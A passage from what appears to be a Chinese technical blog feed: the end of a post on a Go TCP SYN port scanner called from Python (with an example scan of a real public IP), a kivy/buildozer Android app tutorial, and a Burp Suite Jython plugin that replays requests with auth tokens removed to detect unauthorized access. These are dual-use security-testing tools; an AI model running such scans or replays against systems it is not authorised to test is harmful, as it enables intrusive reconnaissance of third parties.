0x8002, Window: 8192, ChkSum: 0, UrgentPointer: 0, &#125; buff := new(bytes.Buffer) err = binary.Write(buff, binary.BigEndian, tcpH) checkError(err) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data := buff.Bytes() checkSum := CheckSum(data, ipstr2Bytes(laddr), ipstr2Bytes(raddr)) //fmt.Printf("CheckSum 0x%X\n", checkSum) tcpH.ChkSum = checkSum buff = new(bytes.Buffer) binary.Write(buff, binary.BigEndian, tcpH) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data = buff.Bytes() //fmt.Printf("% X\n", data) _, err = conn.Write(data) checkError(err)&#125;func recvSynAck(laddr, raddr string, res chan&lt;- *scanResult) error &#123; listenAddr, err := net.ResolveIPAddr("ip4", laddr) // 解析域名为ip checkError(err) conn, err := net.ListenIP("ip4:tcp", listenAddr) defer conn.Close() checkError(err) for &#123; buff := make([]byte, 1024) _, addr, err := conn.ReadFrom(buff) if err != nil &#123; continue &#125; if addr.String() != raddr || buff[13] != 0x12 &#123; continue &#125; var port uint16 binary.Read(bytes.NewReader(buff), binary.BigEndian, &amp;port) res &lt;- &amp;scanResult&#123; Port: port, Opened: true, &#125; &#125;&#125;func ipstr2Bytes(addr string) [4]byte &#123; s := strings.Split(addr, ".") b0, _ := strconv.Atoi(s[0]) b1, _ := strconv.Atoi(s[1]) b2, _ := strconv.Atoi(s[2]) b3, _ := strconv.Atoi(s[3]) return [4]byte&#123;byte(b0), byte(b1), byte(b2), byte(b3)&#125;&#125;func random(min, max int) int &#123; return rand.Intn(max-min) + min&#125;func interfaceAddress(ifaceName string ) string &#123; iface, err:= net.InterfaceByName(ifaceName) if err != nil &#123; panic(err) &#125; addr, err := iface.Addrs() if err != nil &#123; panic(err) &#125; addrStr := strings.Split(addr[0].String(), "/")[0] return addrStr&#125;func portSplit(portRange *string) (uint16, uint16) &#123; ports := strings.Split(*portRange, "-") minPort, err := strconv.ParseUint(ports[0], 10, 16) if err !=nil &#123; panic(err) &#125; maxPort, err := strconv.ParseUint(ports[1], 10, 16) if err != nil &#123; panic(err) &#125; if minPort &gt; maxPort &#123; panic(errors.New("minPort must greater than maxPort")) &#125; return uint16(minPort), uint16(maxPort)&#125; 代码运行结果：没错，就是2s！我测试了扫描全端口（0-65535），大概120s左右，而且稳定性不错。 scan for go+python 经过前面的测试我们不难发现，在并发的性能上，go完胜python，但go不适合做复杂的逻辑处理，以及web开发之类的。因此如何整合python跟go呢？这里我想了两种方案，第一种将go语言打包成.so动态连接库，利用python的ctypes模块可以调用；第二种是go写成接口，提供python调用。写成接口的方式相对简单一些，因此这里不介绍了，说说如何打包go，即如何利用python调用go的方法或者说函数。 先看下修改过后的tcp_syn_scan.go代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299package main// port tcp syn scanimport ( "C" "os" "bytes" "encoding/binary" "fmt" "log" "math/rand" "net" "strconv" "strings" "time" "errors")//TCPHeader testtype TCPHeader struct &#123; SrcPort uint16 DstPort uint16 SeqNum uint32 AckNum uint32 Flags uint16 Window uint16 ChkSum uint16 UrgentPointer uint16&#125;//TCPOption testtype TCPOption struct &#123; Kind uint8 Length uint8 Data []byte&#125;type scanResult struct &#123; Port uint16 Opened bool&#125;type scanJob struct &#123; Laddr string Raddr string SPort uint16 DPort uint16 Stop uint8&#125;var stopFlag = make(chan uint8, 1)//export Scanfunc Scan(remote_ *C.char, portRange_ *C.char, interfaceName_ *C.char) &#123; rate := time.Second / 400 throttle := time.Tick(rate) jobs := make(chan *scanJob, 65536) results := make(chan *scanResult, 1000) for w := 0; w &lt; 10; w++ &#123; go worker(w, jobs, throttle, results) &#125; // 获取命令行参数 // ifaceName := flag.String("i", "eth0", "Specify network") // remote := flag.String("r", "", "remote address") // portRange := flag.String("p", "1-1024", "port range: -p 1-1024") // flag.Parse() interfaceName_1 := C.GoString(interfaceName_) remote_1 := C.GoString(remote_) portRange_1 := C.GoString(portRange_) ifaceName := &amp;interfaceName_1 remote := &amp;remote_1 portRange := &amp;portRange_1 s_time := time.Now().Unix() laddr := interfaceAddress(*ifaceName) // raddr := *remote minPort , maxPort := portSplit(portRange) fmt.Println(laddr, raddr) // 输出源ip地址，目标ip地址 go func(num int)&#123; for i := 0; i &lt; num; i++ &#123; recvSynAck(laddr, raddr, results) &#125; &#125;(10) go func(jobLength int) &#123; for j := minPort; j &lt; maxPort + 1; j++ &#123; s := scanJob&#123; Laddr: laddr, Raddr: raddr, SPort: uint16(random(10000, 65535)), DPort: uint16(j + 1), &#125; jobs &lt;- &amp;s &#125; jobs &lt;- &amp;scanJob&#123;Stop: 1&#125; &#125;(1024) for &#123; select &#123; case res := &lt;-results: fmt.Println("扫描到开放的端口：",res.Port) //输出开放的端口号 case &lt;-stopFlag: e_time := time.Now().Unix() fmt.Println("本次扫描总共耗时(s):",e_time-s_time) os.Exit(0) &#125; &#125;&#125;func worker(id int, jobs &lt;-chan *scanJob, th &lt;-chan time.Time, results chan&lt;- *scanResult) &#123; for j := range jobs &#123; if j.Stop != 1 &#123; sendSyn(j.Laddr, j.Raddr, j.SPort, j.DPort) &#125; else &#123; stopFlag &lt;- j.Stop &#125; &lt;-th &#125;&#125;func checkError(err error) &#123; // 错误check if err != nil &#123; log.Println(err) &#125;&#125;//CheckSum testfunc CheckSum(data []byte, src, dst [4]byte) uint16 &#123; pseudoHeader := []byte&#123; src[0], src[1], src[2], src[3], dst[0], dst[1], dst[2], dst[3], 0, 6, 0, byte(len(data)), &#125; totalLength := len(pseudoHeader) + len(data) if totalLength%2 != 0 &#123; totalLength++ &#125; d := make([]byte, 0, totalLength) d = append(d, pseudoHeader...) d = append(d, data...) return ^mySum(d)&#125;func mySum(data []byte) uint16 &#123; var sum uint32 for i := 0; i &lt; len(data)-1; i += 2 &#123; sum += uint32(uint16(data[i])&lt;&lt;8 | uint16(data[i+1])) &#125; sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff) sum = sum + (sum &gt;&gt; 16) return uint16(sum)&#125;func sendSyn(laddr, raddr string, sport, dport uint16) &#123; conn, err := net.Dial("ip4:tcp", raddr) checkError(err) defer conn.Close() op := []TCPOption&#123; TCPOption&#123; Kind: 2, Length: 4, Data: []byte&#123;0x05, 0xb4&#125;, &#125;, TCPOption&#123; Kind: 0, &#125;, &#125; tcpH := TCPHeader&#123; SrcPort: sport, DstPort: dport, SeqNum: rand.Uint32(), AckNum: 0, Flags: 0x8002, Window: 8192, ChkSum: 0, UrgentPointer: 0, &#125; buff := new(bytes.Buffer) err = binary.Write(buff, binary.BigEndian, tcpH) checkError(err) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data := buff.Bytes() checkSum := CheckSum(data, ipstr2Bytes(laddr), ipstr2Bytes(raddr)) //fmt.Printf("CheckSum 0x%X\n", checkSum) tcpH.ChkSum = checkSum buff = new(bytes.Buffer) binary.Write(buff, binary.BigEndian, tcpH) for i := range op &#123; binary.Write(buff, binary.BigEndian, op[i].Kind) binary.Write(buff, binary.BigEndian, op[i].Length) binary.Write(buff, binary.BigEndian, op[i].Data) &#125; binary.Write(buff, binary.BigEndian, [6]byte&#123;&#125;) data = buff.Bytes() //fmt.Printf("% X\n", data) _, err = conn.Write(data) checkError(err)&#125;func recvSynAck(laddr, raddr string, res chan&lt;- *scanResult) error &#123; listenAddr, err := net.ResolveIPAddr("ip4", laddr) // 解析域名为ip checkError(err) conn, err := net.ListenIP("ip4:tcp", listenAddr) defer conn.Close() checkError(err) for &#123; buff := make([]byte, 1024) _, addr, err := conn.ReadFrom(buff) if err != nil &#123; continue &#125; if addr.String() != raddr || buff[13] != 0x12 &#123; continue &#125; var port uint16 binary.Read(bytes.NewReader(buff), binary.BigEndian, &amp;port) res &lt;- &amp;scanResult&#123; Port: port, Opened: true, &#125; &#125;&#125;func ipstr2Bytes(addr string) [4]byte &#123; s := strings.Split(addr, ".") b0, _ := strconv.Atoi(s[0]) b1, _ := strconv.Atoi(s[1]) b2, _ := strconv.Atoi(s[2]) b3, _ := strconv.Atoi(s[3]) return [4]byte&#123;byte(b0), byte(b1), byte(b2), byte(b3)&#125;&#125;func random(min, max int) int &#123; return rand.Intn(max-min) + min&#125;func interfaceAddress(ifaceName string ) string &#123; iface, err:= net.InterfaceByName(ifaceName) if err != nil &#123; panic(err) &#125; addr, err := iface.Addrs() if err != nil &#123; panic(err) &#125; addrStr := strings.Split(addr[0].String(), "/")[0] return addrStr&#125;func portSplit(portRange *string) (uint16, uint16) &#123; ports := strings.Split(*portRange, "-") minPort, err := strconv.ParseUint(ports[0], 10, 16) if err !=nil &#123; panic(err) &#125; maxPort, err := strconv.ParseUint(ports[1], 10, 16) if err != nil &#123; panic(err) &#125; if minPort &gt; maxPort &#123; panic(errors.New("minPort must greater than maxPort")) &#125; return uint16(minPort), uint16(maxPort)&#125;func main() &#123; &#125; 然后利用go自身的build命令，将其打包成.so库：1go build -buildmode=c-shared -o tcp_syn_scan.so tcp_syn_scan.go 打包后会得到一个tcp_syn_scan.so和一个tcp_syn_scan.h。然后利用下面的python代码就可以调用Go代码中的Scan()函数了，创建一个tcp_syn_scan.py文件。12345#! -*- coding:utf-8 -*-from ctypes import *lib = cdll.LoadLibrary(u'./scan.so')lib.Scan("14.215.177.38","1-1024","eth0") # ip,端口范围，网卡 代码运行结果： 说明：相当原生的go，利用python去调用go会损耗一些性能，但总体上还可以。 后记本文结论就是可以利用go开发扫描模块（性能更佳），并结合python调用。本文代码项目地址：https://github.com/tengzhangchao/PortScan 参考文章https://blog.csdn.net/pwc1996/article/details/73469850]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[利用python开发app实战]]></title>
    <url>../../../../../../../../2018/05/08/1/</url>
    <content type="text"><![CDATA[你说，我们的未来被装进棺材，染不上尘埃 我很早之前就想开发一款app玩玩，无奈对java不够熟悉，之前也没有开发app的经验，因此一直耽搁了。最近想到尝试用python开发一款app，google搜索了一番后，发现确实有路可寻，目前也有了一些相对成熟的模块，于是便开始了动手实战，过程中发现这其中有很多坑，好在最终依靠google解决了，因此小记一番。 说在前面的话 python语言虽然很万能，但用它来开发app还是显得有点不对路，因此用python开发的app应当是作为编码练习、或者自娱自乐所用，加上目前这方面的模块还不是特别成熟，bug比较多，总而言之，劝君莫轻入。 准备工作 利用python开发app需要用到python的一个模块–kivy，kivy是一个开源的，跨平台的Python开发框架，用于开发使用创新的应用程序。简而言之，这是一个python桌面程序开发框架（类似wxpython等模块），强大的是kivy支持linux、mac、windows、android、ios平台，这也是为什么开发app需要用到这个模块。 虽然kivy是跨平台的，但是想要在不同的平台使用python代码，还需要将python代码打包成对应平台的可执行程序，好在kivy项目下有个打包工具项目–buildozer，这是官方推荐的打包工具，因为相对比较简单，自动化程度高，其他项目比如：python-for-android也能起到类似的作用，这里不展开介绍。 搭建kivy开发环境需要在pc上安装kivy开发环境，这里演示下mac与linux下的安装过程。 install kivy for mac安装一些依赖包：1brew install pkg-config sdl2 sdl2_image sdl2_ttf sdl2_mixer gstreamer 安装cython以及kivy：12pip install cython==0.25pip install kivy 如果安装kivy报错，则使用下面的方式安装kivy：12git clone https://github.com/kivy/kivypython setup.py install 安装后测试：12345678910$pythonPython 2.7.10 (default, Jul 15 2017, 17:16:57)[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt;&gt;&gt;&gt; import kivy[INFO ] [Logger ] Record log in /Users/didi/.kivy/logs/kivy_18-05-08_4.txt[INFO ] [Kivy ] v1.10.1.dev0, git-5f6c66e, 20180507[INFO ] [Python ] v2.7.10 (default, Jul 15 2017, 17:16:57)[GCC 4.2.1 Compatible Apple LLVM 9.0.0 (clang-900.0.31)] 说明：导入kivy模块没有报错则说明安装成功。 install kivy for centos7先安装依赖：123456789101112131415161718yum install \ make \ mercurial \ automake \ gcc \ gcc-c++ \ SDL_ttf-devel \ SDL_mixer-devel \ khrplatform-devel \ mesa-libGLES \ mesa-libGLES-devel \ gstreamer-plugins-good \ gstreamer \ gstreamer-python \ mtdev-devel \ python-devel \ python-pip \ java-devel 安装cython以及kivy:12pip install Cython==0.20pip install kivy centos安装kivy参考：https://kivy.org/docs/installation/installation-linux.html#using-software-packages 说明：其他安装kivy方式可移步：https://kivy.org/#download（需要翻墙） 用kivy开发第一个python app安装完kivy就可以开发app程序了，这里演示下hello-world程序，关于kivy更复杂的用法不是本文重点，后面再成文介绍。1) 创建一个main.py文件，写入：123456789#! -*- coding:utf-8 -*-from kivy.app import Appclass HelloApp(App): passif __name__ == '__main__': HelloApp().run() 2)创建一个hello.kv文件，写入：12Label: text: 'Hello, World! I am nMask' 简单说明：main.py是入口函数，定义了一个HelloApp类，该类继承kivy.app；hello.kv文件是kivy程序，相当于定义界面风格等，该文件命名规则为类名小写且去除app。 运行第一个python app1python main.py 运行结果： 安装buildozer工具 通过以上的编码，我创建了自己的第一个python app程序，该程序可以直接在mac、linux、windows平台下运行，那么如何让它在安卓或者苹果手机上运行呢？我们知道在安卓上运行，需要将其打包成apk安装程序，因此就需要用到前面提到过的buildozer工具，（buildozer工具可以打包kivy程序，支持android、ios等），buildozer的安装过程比较简单：1pip install buildozer 使用buildozer工具将kivy程序打包成apk在python项目目录下运行：1buildozer init 运行成功将会创建一个配置文件buildozer.spec，可以通过修改配置文件更改app的名称等，然后运行：1buildozer android debug deploy run 运行以上命令将会生成跨平台的安装包，可适用安卓、ios等，如果用于安卓，则是利用python-for-android项目。 在第一次运行以上命令的时候，会自动在系统中下载安卓sdk等必要文件，如下图。（过程需要翻墙，而且有很多依赖需要下载） 说明：这里只演示打包成apk文件，iso平台的可自行研究，参考文档：https://github.com/kivy/buildozer。 python apk程序测试如果以上步骤都运行成功的话，应该会在项目目录下的bin目录下生成一个apk文件，类似如下： 然后将apk下载到安卓系统的手机上，安装即可，测试效果如下：打开app： buildozer使用说明1234567891011121314151617181920212223242526272829303132333435363738394041Usage: buildozer [--profile &lt;name&gt;] [--verbose] [target] &lt;command&gt;... buildozer --versionAvailable targets: android Android target, based on python-for-android project ios iOS target, based on kivy-ios project android_old Android target, based on python-for-android project (old toolchain)Global commands (without target): distclean Clean the whole Buildozer environment. help Show the Buildozer help. init Create a initial buildozer.spec in the current directory serve Serve the bin directory via SimpleHTTPServer setdefault Set the default command to run when no arguments are given version Show the Buildozer versionTarget commands: clean Clean the target environment update Update the target dependencies debug Build the application in debug mode release Build the application in release mode deploy Deploy the application on the device run Run the application on the device serve Serve the bin directory via SimpleHTTPServerTarget "android_old" commands: adb Run adb from the Android SDK. Args must come after --, or use --alias to make an alias logcat Show the log from the deviceTarget "ios" commands: list_identities List the available identities to use for signing. xcode Open the xcode project.Target "android" commands: adb Run adb from the Android SDK. Args must come after --, or use --alias to make an alias logcat Show the log from the device p4a Run p4a commands. Args must come after --, or use --alias to make an alias buildozer打包过程中的坑点如果在打包过程中遇到报错，可以修改buildozer.spec配置文件中的log_level为2，然后重新运行，可以看具体的错误信息。 报错：You might have missed to install 32bits libs这个错是我在centos7上运行时报的错，大意是系统缺少了某些32位的依赖文件。解决方案：1yum -y install --skip-broken glibc.i686 arts.i686 audiofile.i686 bzip2-libs.i686 cairo.i686 cyrus-sasl-lib.i686 dbus-libs.i686 directfb.i686 esound-libs.i686 fltk.i686 freeglut.i686 gtk2.i686 hal-libs.i686 imlib.i686 lcms-libs.i686 lesstif.i686 libacl.i686 libao.i686 libattr.i686 libcap.i686 libdrm.i686 libexif.i686 libgnomecanvas.i686 libICE.i686 libieee1284.i686 libsigc++20.i686 libSM.i686 libtool-ltdl.i686 libusb.i686 libwmf.i686 libwmf-lite.i686 libX11.i686 libXau.i686 libXaw.i686 libXcomposite.i686 libXdamage.i686 libXdmcp.i686 libXext.i686 libXfixes.i686 libxkbfile.i686 libxml2.i686 libXmu.i686 libXp.i686 libXpm.i686 libXScrnSaver.i686 libxslt.i686 libXt.i686 libXtst.i686 libXv.i686 libXxf86vm.i686 lzo.i686 mesa-libGL.i686 mesa-libGLU.i686 nas-libs.i686 nss_ldap.i686 cdk.i686 openldap.i686 pam.i686 popt.i686 pulseaudio-libs.i686 sane-backends-libs-gphoto2.i686 sane-backends-libs.i686 SDL.i686 svgalib.i686 unixODBC.i686 zlib.i686 compat-expat1.i686 compat-libstdc++-33.i686 openal-soft.i686 alsa-oss-libs.i686 redhat-lsb.i686 alsa-plugins-pulseaudio.i686 alsa-plugins-oss.i686 alsa-lib.i686 nspluginwrapper.i686 libXv.i686 libXScrnSaver.i686 qt.i686 qt-x11.i686 pulseaudio-libs.i686 pulseaudio-libs-glib2.i686 alsa-plugins-pulseaudio.i686 python-matplotli 参考：https://ask.fedoraproject.org/en/question/9556/how-do-i-install-32bit-libraries-on-a-64-bit-fedora/ 报错：Error compiling Cython file错误大意为cython文件出错，可能是cython模块没有安装，或者版本有问题。解决方案：1pip install cython==0.25 报错：IOError: [Errno 2] No such file or directory…..这是在打包的最后一步，将apk文件copy到项目bin目录下时报的错，是buildozer的一个bug。解决方案：修改/usr/local/lib/python2.7/dist-packages/buildozer/tagets/android.py文件：(1)在文件开头导入:1from distutils.version import LooseVersion (2) 将786行:XXX found how the apk name is really built from the title这一行以下的代码替换为：123456__sdk_dir = self.android_sdk_dirbuild_tools_versions = os.listdir(join(__sdk_dir, 'build-tools'))build_tools_versions = sorted(build_tools_versions, key=LooseVersion)build_tools_version = build_tools_versions[-1]gradle_files = ["build.gradle", "gradle", "gradlew"]is_gradle_build = any((exists(join(dist_dir, x)) for x in gradle_files)) and build_tools_version &gt;= ’25.0' buildozer虚拟机 kivy官方推出了一个buildozer虚拟机镜像，已经安装好了buildozer以及一些依赖文件，为buildozer打包测试提供平台。由于之前我在mac上利用buildozer打包一直报错，后来换成centos也依然没有成功，因此便下载了此虚拟机，测试效果如下： 虚拟机下载地址：http://txzone.net/files/torrents/kivy-buildozer-vm-2.0.zip 说明：对于无法解决依赖问题的朋友，可以使用此虚拟机进行程序打包，开发环境还是推荐用自己的本机。 kivy开发实例 因为本文重点在于介绍如何利用kivy+buildozer开发一款python app，因此对于kivy的开发过程，以及app功能进行了最简化。想要学习如何开发更复杂的app，可参考：https://muxuezi.github.io/posts/kivy-perface.html# ～！～ 折腾python使我快乐，……，想想还是滚回去学java吧 ～！～]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python开发app</tag>
        <tag>android for python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[burpsuite插件开发之检测越权访问漏洞]]></title>
    <url>../../../../../../../../2018/05/04/1/</url>
    <content type="text"><![CDATA[那个喝醉的夜晚，挡不住我们的步伐 前些天公司买了些BurpSuite的License，终于可以用上正版了，先给公司来波赞！好啦，言归正传，BurpSuite作为Web安全测试的一大神器，其中一个优势就是其扩展性好。BurpSuite支持Java、Python、Ruby作为其插件的扩展语言，而在其内置的Bapp_Store中也有很多很强大的插件。作为一名程序猿，心想是时候自己动手开发一款专属插件了，抱着此心态我便开始尝试学习摸索着Coding，于是便有了此文。 插件语言的选择 以上所述Burp支持Java、Python、Ruby语言的扩展，相对来说我更熟悉Python，因此就用Python开始学习写插件，对于速度要求高的朋友可以用Java写。熟悉Python的朋友肯定知道，Python分为Cython、Jython等。前者就是我们通常所说的Python，后者是Java版本的Python，简单理解就是用Jython可以调用Java的库。 burpsuite jython开发环境 想要开发使用一款属于自己的BurpSuite插件，必须要部署好Jython开发环境以及Jython运行环境。前者需要在开发jython程序的平台上搭建环境，后者需要在运行burpsuite的平台搭建环境。鉴于一般开发以及使用插件都在用一个平台上，比如mac，因此本文介绍一下如何在mac上安装jython环境。 install jython for Mac首先我们需要在mac上安装jython的环境以便开发jython程序，就像安装python环境一样，mac上安装jython命令：1brew install jython 安装完以后，jython安装在/usr/local/Cellar/jython/目录下，需要设置环境变量，将/usr/local/Cellar/jython/2.7.1/libexec/bin添加到环境变量，然后在shell中输入： 12345$jythonJython 2.7.1 (default:0df7adb1b397, Jun 30 2017, 19:02:43)[Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on java1.8.0_111Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; 说明：其他平台（windows，linux）安装jython方式请自行google，应该比较类似。 Load Jython to Burpsuitemac上安装完jython环境后，需要在burpsuite中加载jython环境，注意这里选择的是jar文件。 开发jython程序本篇以开发一款检测未授权访问漏洞的插件为例介绍一下插件的开发过程，由于本文重点在于介绍如何开发一款bp插件，以及一些不可抗因素，本文介绍的插件均为简化后的版本。 创建main.py文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#! -*- coding:utf-8 -*-import refrom burp import IBurpExtender # 定义插件的基本信息类from burp import IHttpListener # http流量监听类from noauth import noauth_request# 敏感接口检测，并输出敏感接口信息res_host = re.compile(r'Host: ([^,]*)')res_path = re.compile(r'(GET|POST) ([^ ]*) HTTP/')class BurpExtender(IBurpExtender, IHttpListener): def registerExtenderCallbacks(self, callbacks): self._callbacks = callbacks self._helpers = callbacks.getHelpers() # 通用函数 self._callbacks.setExtensionName("sensitive_interface_scan") print "load sensitive_interface_scan plugin success!" print "=============================================" print "" # register ourselves as an HTTP listener callbacks.registerHttpListener(self) def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo): if toolFlag == 4: if not messageIsRequest: response = messageInfo.getResponse() # get response analyzedResponse = self._helpers.analyzeResponse(response) body = response[analyzedResponse.getBodyOffset():] body_string = body.tostring() # get response_body request = messageInfo.getRequest() analyzedRequest = self._helpers.analyzeResponse(request) request_header = analyzedRequest.getHeaders() try: method,path = res_path.findall(request_header[0])[0] host = res_host.findall(request_header[1])[0] url = method+" "+host+path except: url = "" if method=="GET": # 检测GET请求的接口 print "[Info]Check url is ",url cur = noauth_request(host,path,body_string) noauth_result = cur.run() if noauth_result: print "[Info]Found it is a noauth Interface %s" % noauth_result[0][0] print "[Info]remove param is ",noauth_result[0][1] print "======================================================================================" print "" 说明：此文件为插件入口文件，其中导入的burp内置类IBurpExtender为基类，即所有插件都需要使用继承此类，IHttpListener类用来获取http请求以及响应内容。 创建noauth.py文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#! -*- coding:utf-8 -*-'''未授权访问poc(GET)'''import requestsfrom furl import furlauth_params=["token","sign","ticket"]# headers 里面除去cookieheaders=&#123; "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36", "Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,mt;q=0.7,zh-TW;q=0.6", "Accept-Encoding":"gzip, deflate", "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "Cookie":"test",&#125;class noauth_request(object): # 未授权访问漏洞检测 def __init__(self,host,path,body_string): self.url = "http://"+host+path self.uri = str(furl(self.url).remove(args=True)) self.body_string = body_string self.param = dict(furl(self.url).args) self.remove_param = [] def run(self): result_list=[] self.remove_auth() # remove params,example:auth,token,sign...... response_body,current_url = self.get_response() if response_body == self.body_string: result_list.append((current_url,self.remove_param,response_body)) return result_list def remove_auth(self): # 删除用户认证的参数 for i in auth_params: if self.param.has_key(i): self.remove_param.append(i) self.param.pop(i) def get_response(self): # 重放接口获取返回值 current_url = "" response_body = "" try: res=requests.get(url=self.uri, params=self.param, timeout=20, headers=headers) except Exception,e: print "[noauth_request:get_response]"+str(e) if "HTTPSConnectionPool" in str(e): try: res=requests.get(url=self.uri.replace("http://","https://"), params=self.param, timeout=20, headers=headers) except Exception,e: print "[noauth_request:get_response]"+str(e) else: current_url = res.url response_body = res.text else: current_url = res.url response_body = res.text return response_body,current_url 说明：此文件为检测未授权访问类，功能比较简单，获取原始请求以及响应包，去除请求接口的cookie以及token等认证后重放，查看返回结果有没有变化。一般情况下还会检测响应包是否包含敏感信息，这里为了方便演示，简化了插件功能。 将jython程序添加到burpsuite中选择添加一个插件：注意下图中的标记部分：说明：类型选择python，文件选择入口文件，burpsuite会自动获取本地的依赖文件；输出这里选择在控制台输出，因为此插件没有写ui界面。 加载成功后，会在控制台输出： 然后我们就去开启浏览器代理，关闭bp拦截，愉快的进行web系统测试吧，若插件检测到了未授权访问的接口，则会输出类似如下： 增加UI界面代码在控制台输出的方式总归没有那么优雅，因此如果能像其内置的功能那样在界面上输出就更好了。以下是一段简单的ui界面开发代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445# -*- coding:utf-8 -*-# 导入 burp 接口from burp import IBurpExtender, ITab# 导入 Java 库from javax.swing import JPanelfrom javax.swing import JButtonclass BurpExtender(IBurpExtender, ITab): ''' 继承burp java父类 ''' def registerExtenderCallbacks(self, callbacks): # 注册插件信息 self._cb = callbacks # 回调 self._hp = callbacks.getHelpers() # 帮助信息 self._cb.setExtensionName('python_test_plugin') # 插件名称 print 'load python_test_plugin success!' self.mainPanel = JPanel() # 面板 self.testBtn = JButton(u'一个按钮', actionPerformed=self.testBtn_onClick) # 初始化一个 JButton 并绑定单击事件 self.mainPanel.add(self.testBtn) # 面板中添加这个按钮 self._cb.customizeUiComponent(self.mainPanel) self._cb.addSuiteTab(self) def testBtn_onClick(self, event): # 点击按钮事件 print "click button" def getTabCaption(self): # 获取tab按钮名称 return 'python_test_plugin' def getUiComponent(self): # 获取面板内容· return self.mainPanel 说明：这只是一个ui界面开发的demo，效果如下： burp插件开发文档这里介绍几个常用的burp类：1234567891011121. 插件入口和帮助接口类：IBurpExtender、IBurpExtenderCallbacks、IExtensionHelpers、IExtensionStateListenerIBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且类命名为BurpExtender。 IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider......）、各个通信对象（HttpRequestResponse、HttpService、SessionHandlingAction）之间的纽带。 IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。2. UI相关接口类：IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、IMessageEditor、IMenuItemHandler这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。3. Burp工具组件接口类：IInterceptedProxyMessage、IIntruderAttack、IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。4. HTTP消息处理接口类：ICookie、IHttpListener、IHttpRequestResponse、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、IRequestInfo、IParameter、IResponseInfo这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。 关于更多关于burp开发相关的文档，可以参考下：https://portswigger.net/burp/extender/ 本文参考http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/ 写不动了~]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于余弦相似性的404页面识别]]></title>
    <url>../../../../../../../../2018/04/12/1/</url>
